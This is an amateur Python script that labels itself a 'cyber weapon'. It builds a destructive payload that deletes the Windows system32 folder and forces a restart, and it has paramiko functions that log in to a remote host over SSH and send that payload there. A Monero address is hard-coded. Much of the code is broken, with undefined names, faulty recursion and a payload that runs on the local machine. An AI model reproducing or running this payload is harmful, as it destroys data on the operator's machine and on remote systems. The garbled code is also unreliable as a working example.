import subprocess
import os
import time as t
clear = lambda: os.system('cls')

xmr = '49MJchKQf35VcoxZs1UHut3rFJyq6aq9C5CRQUUeEunWJUBdkUSmYem87UgqDm9UHX6ucngE59pRL4UojzTmXWKH6o3BTeP'

def payload():
    print('dropping bomb! \v/')
    try:  
        clear()
        os.system('@cmd /k del c:\\WINDOWS\system32')
        clear()
        os.system('@cmd /k echo lol, lmao even')
        os.system('@cmd /k shutdown -r')
    except AttributeError as e:
        print('restarting')
        main()
    print('fucked em up!')

def ssh_input():
    keyPath = input('enter ssh key path')
    address = input('enter ip or url address')
    userN = input('enter user name')
    passW = input('enter password')
    return(keyPath, address, userN, passW)

def ssh_paramiko_key(keyPath, address, userN):
    import paramiko
    errToken = 0
    key = paramiko.RSAKey.from_private_key_file(keyPath)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("connecting....")
    try:
        client.connect(hostname=address, username=userN, pkey=key)
    except IOError as e:
        while errToken < 5:
            print('Error, restarting...')
            ssh_paramiko_key()
            errToken += 1
            if errToken > 5:
                print('Going back to menu...')
                main()
    print("connected!")
    print('Injecting payload now')
    cmds = [payload()]
    for cmd in cmds:
        print("Executing {}".format(cmd))
        stdin, stdout, stderr = client.exec_command(cmd)
        print(stdout.read())
        print("Errors")
        print(stderr.read())
    client.close()

def ssh_paramiko_password(passW, address, userN):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("connecting....")
    try:
        client.connect(hostname=address, username=userN, password=passW)
    except IOError as e:
        while errToken < 5:
            print('Error, restarting...')
            ssh_paramiko_key()
            errToken += 1
            if errToken > 5:
                print('Going back to menu...')
                main()
    print("connected!")
    print('Injecting payload now')
    cmds = [payload()]
    for cmd in cmds:
        print("Executing {}".format(cmd))
        stdin, stdout, stderr = client.exec_command(cmd)
        print(stdout.read())
        print("Errors")
        print(stderr.read())
    client.close()


def ssh_tunnel_password(ipad, usern, passw):
    from paramiko import SSHClient, AutoAddPolicy
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        print('Digging a tunnel ->O')
        # .connect('ipadres=192.168.1.0', username='root', password= 'password1')
        client.connect(ipad, username=usern, password=passw)
        print('Your through! =)')
    except IOError as e:
        print('Error, trying again')
        ssh_input()
        ssh_tunnel_password(ipad, usern, passw)


def ssh_tunnel_key(ipad, usern, keyPath):
    from paramiko import SSHClient, AutoAddPolicy
    client = SSHClient()
    pkey = from_private_key_file("./id_rsa")
    keyPath1 = keyPath.replace('\\', '/')
    client.load_host_keys(filename=None)
    client.load_system_host_keys(keyPath1)
    client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        print('Digging a tunnel ->O')
        # .connect('ipadres=192.168.1.0', username='root', password= 'password1')
        client.connect(ipad, username=usern, password=passw)
        print('Your through! =)')
    except IOError as e:
        print('Error, trying again')
        ssh_input()
        ssh_tunnel_key(ipad, usern, passw)


def ultimatum():
    os.system('start /B start cmd.exe')
    os.system()
    os.system('@cmd /k echo lol, lmao even')
 



       






def main():
    print('starting up cyber weapon in minecraft')
    print('loading.................')
    t.sleep(5)
    print()


time.sleep(5)
# gives file location inside host
help = 'os.chdir(), osmkdir(), os.rename(old,new), os.remove, os.rmdir, os.path.exists, os.walk'
cwd = os.getcwd()
dirlist = os.listdir()
print(cwd, dirlist)
# client.close()

raw = r'C:\Windows\System32\cmd.exe'
input = raw.replace('\\', '/')
subprocess.Popen([input])
